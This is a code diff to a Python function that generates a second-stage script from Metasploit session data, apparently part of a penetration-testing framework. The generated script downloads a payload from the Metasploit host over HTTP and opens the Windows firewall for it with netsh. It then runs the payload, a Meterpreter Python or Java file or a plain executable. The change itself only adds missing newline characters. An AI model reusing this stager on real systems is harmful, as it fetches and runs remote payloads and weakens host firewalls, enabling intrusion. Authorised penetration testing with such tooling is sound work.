@@ -197,6 +197,7 @@ def makeStageTwoPyScript(targetData, httpPort):
     execute it
     firewallOpen = ["netsh", "firewall", "add", "allowedprogram", "exe", "ENABLE"]
     """
+
     for sessionData in targetData['SESSION_DATASETS']:
         if 'PAYLOAD' in sessionData and sessionData['MODULE']['NAME'].lower() == "exploit/multi/handler":
             msfIpAddress = sessionData['MSF_HOST']['IP_ADDRESS']
@@ -204,13 +205,13 @@ def makeStageTwoPyScript(targetData, httpPort):
             stageTwoPyContent = stageTwoPyContent + "url = 'http://" + msfIpAddress + ":" + str(httpPort) + "/" + payloadFile + "'\n"
             stageTwoPyContent = stageTwoPyContent + "fileName = r'" + targetData['PAYLOAD_DIRECTORY'] + '\\' + payloadFile + "'\n"
             if '.py' in payloadFile:
-                stageTwoPyContent = stageTwoPyContent + "fwOpen = ['netsh', 'firewall', 'add', 'allowedprogram', " + targetData['METERPRETER_PYTHON'] + ", 'ENABLE']"
+                stageTwoPyContent = stageTwoPyContent + "fwOpen = ['netsh', 'firewall', 'add', 'allowedprogram', " + targetData['METERPRETER_PYTHON'] + ", 'ENABLE']\n"
                 stageTwoPyContent = stageTwoPyContent + "cmdList = [r'" + targetData['METERPRETER_PYTHON'] +"', fileName]\n"
             elif 'jar' in payloadFile:
-                stageTwoPyContent = stageTwoPyContent + "fwOpen = ['netsh', 'firewall', 'add', 'allowedprogram', " + targetData['METERPRETER_JAVA'] + ", 'ENABLE']"
+                stageTwoPyContent = stageTwoPyContent + "fwOpen = ['netsh', 'firewall', 'add', 'allowedprogram', " + targetData['METERPRETER_JAVA'] + ", 'ENABLE']\n"
                 stageTwoPyContent = stageTwoPyContent + "cmdList = [r'" + targetData['METERPRETER_JAVA'] + "','-jar', fileName]\n"
             else:
-                stageTwoPyContent = stageTwoPyContent + "fwOpen = ['netsh', 'firewall', 'add', 'allowedprogram', fileName, 'ENABLE']"
+                stageTwoPyContent = stageTwoPyContent + "fwOpen = ['netsh', 'firewall', 'add', 'allowedprogram', fileName, 'ENABLE']\n"
                 stageTwoPyContent = stageTwoPyContent + "cmdList = [fileName]\n"
             stageTwoPyContent = stageTwoPyContent + "try:\n"
             stageTwoPyContent = stageTwoPyContent + "  urllib.urlretrieve(url, fileName)\n"
